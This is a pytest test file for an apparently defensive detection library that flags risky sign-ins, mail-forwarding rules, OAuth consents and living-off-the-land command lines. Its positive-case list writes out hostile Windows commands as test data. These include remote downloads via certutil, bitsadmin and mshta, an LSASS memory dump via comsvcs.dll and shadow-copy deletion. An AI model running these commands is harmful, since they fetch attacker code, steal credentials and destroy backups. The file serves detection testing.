from datetime import timedelta

import pytest

from helpers import cmd, signin, ts, ual
from hunterscope.detect import run_detections

WAW = ("Warsaw", "PL", 52.2297, 21.0122)
LON = ("London", "GB", 51.5072, -0.1276)
SAO = ("Sao Paulo", "BR", -23.5505, -46.6333)


def ids(findings):
    return [f.rule_id for f in findings]


def test_failures_then_success_fires_at_threshold(cfg):
    evs = [signin(ts(2, 9, i), ok=False) for i in range(5)] + [signin(ts(2, 9, 10))]
    assert ids(run_detections(evs, cfg)) == ["failures_then_success"]


def test_failures_below_threshold_is_benign(cfg):
    evs = [signin(ts(2, 9, i), ok=False) for i in range(4)] + [signin(ts(2, 9, 10))]
    assert run_detections(evs, cfg) == []


def test_failures_outside_window_do_not_count(cfg):
    evs = [signin(ts(2, 8, i), ok=False) for i in range(5)] + [signin(ts(2, 9, 30))]
    assert run_detections(evs, cfg) == []


def test_failures_from_different_ip_do_not_count(cfg):
    evs = [signin(ts(2, 9, i), ok=False, ip="203.0.113.1") for i in range(5)]
    evs.append(signin(ts(2, 9, 10), ip="192.0.2.5"))
    assert run_detections(evs, cfg) == []


def test_mfa_fatigue(cfg):
    evs = [signin(ts(2, 9, i * 2), ok=False, code=500121) for i in range(5)]
    evs.append(signin(ts(2, 9, 12)))
    assert ids(run_detections(evs, cfg)) == ["mfa_fatigue"]


def test_mfa_denials_without_success_do_not_fire(cfg):
    evs = [signin(ts(2, 9, i), ok=False, code=500121) for i in range(8)]
    assert run_detections(evs, cfg) == []


def test_impossible_travel(cfg):
    evs = [signin(ts(2, 8, 0), loc=WAW), signin(ts(2, 9, 0), loc=SAO)]
    f = run_detections(evs, cfg)
    assert ids(f) == ["impossible_travel"]
    assert "km/h" in f[0].description


def test_flight_is_not_impossible_travel(cfg):
    evs = [signin(ts(2, 8, 0), loc=WAW), signin(ts(2, 15, 30), loc=LON)]
    assert run_detections(evs, cfg) == []


def test_short_hop_below_min_distance_ignored(cfg):
    near = ("Lodz", "PL", 51.7592, 19.4560)
    evs = [signin(ts(2, 8, 0), loc=WAW), signin(ts(2, 8, 1), loc=near)]
    assert run_detections(evs, cfg) == []


@pytest.mark.parametrize(
    ("when", "fires"),
    [
        (ts(2, 8, 0), False),    # Monday 09:00 Warsaw
        (ts(2, 2, 0), True),     # Monday 03:00 Warsaw
        (ts(2, 21, 0), True),    # Monday 22:00 Warsaw
        (ts(7, 10, 0), True),    # Saturday
    ],
)
def test_off_hours(cfg, when, fires):
    assert (ids(run_detections([signin(when)], cfg)) == ["off_hours_login"]) is fires


def test_inbox_rule_external_forward(cfg):
    f = run_detections([ual(ts(2, 9, 0), "New-InboxRule", ForwardTo="x@evil.test")], cfg)
    assert ids(f) == ["suspicious_inbox_rule"]
    assert ("email", "x@evil.test") in f[0].iocs


def test_inbox_rule_internal_forward_still_flagged_but_not_ioc(cfg):
    f = run_detections([ual(ts(2, 9, 0), "Set-InboxRule", ForwardTo="boss@contoso.com")], cfg)
    assert ids(f) == ["suspicious_inbox_rule"]
    assert not any(k == "email" for k, _ in f[0].iocs)


def test_newsletter_rule_is_benign(cfg):
    evs = [ual(ts(2, 9, 0), "New-InboxRule", MoveToFolder="Newsletters",
               SubjectContainsWords="weekly digest")]
    assert run_detections(evs, cfg) == []


def test_oauth_consent_risky_scope_is_high(cfg):
    f = run_detections(
        [ual(ts(2, 9, 0), "Consent to application.", AppName="X", Scope="Mail.ReadWrite")], cfg)
    assert ids(f) == ["oauth_consent"] and f[0].severity == "high"


@pytest.mark.parametrize(
    "line",
    [
        "powershell.exe -NoP -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAaAB1AG4AdABlAHIAJw==",
        "certutil -urlcache -f http://x/a.bin a.bin",
        "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 l.dmp full",
        "whoami /priv",
        "vssadmin delete shadows /all /quiet",
        "mshta https://x.test/a.hta",
        "bitsadmin /transfer j http://x/a a",
        "powershell -c [Convert]::FromBase64String('AAAA')",
    ],
)
def test_lotl_positive(cfg, line):
    assert ids(run_detections([cmd(ts(2, 9, 0), line)], cfg)) == ["lotl_commandline"]


@pytest.mark.parametrize(
    "line",
    ["certutil -hashfile a.exe SHA256", "whoami", "powershell -File backup.ps1", "notepad.exe a.txt"],
)
def test_lotl_benign(cfg, line):
    assert run_detections([cmd(ts(2, 9, 0), line)], cfg) == []


def test_disabled_rule_is_skipped(cfg):
    import copy

    c = copy.deepcopy(cfg)
    c["rules"]["lotl_commandline"]["enabled"] = False
    assert run_detections([cmd(ts(2, 9, 0), "whoami /priv")], c) == []


def test_findings_are_time_ordered(cfg):
    evs = [cmd(ts(2, 12, 0), "whoami /priv"), signin(ts(2, 3, 0))]
    f = run_detections(evs, cfg)
    assert [x.ts for x in f] == sorted(x.ts for x in f)
    assert f[0].ts < f[0].ts + timedelta(seconds=1)
